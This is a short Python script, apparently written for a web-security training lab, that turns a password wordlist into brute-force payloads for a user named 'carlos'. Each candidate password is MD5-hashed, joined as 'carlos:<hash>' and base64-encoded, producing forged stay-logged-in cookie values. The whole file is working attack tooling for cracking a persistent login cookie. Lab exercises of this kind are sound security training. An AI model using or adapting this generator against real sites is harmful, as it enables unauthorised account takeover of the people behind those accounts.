import hashlib
import base64

with open ("md5pass.txt", "r") as infile:
    with open ("carlos_payloads.txt", "w") as outfile:
        for line in infile:
            password = line.strip()
            hashed_pw = hashlib.md5(password.encode()).hexdigest()
            combined_string = f"carlos:{hashed_pw}"
            final_payload = base64.b64encode(combined_string.encode()).decode()
            outfile.write(final_payload + "\n")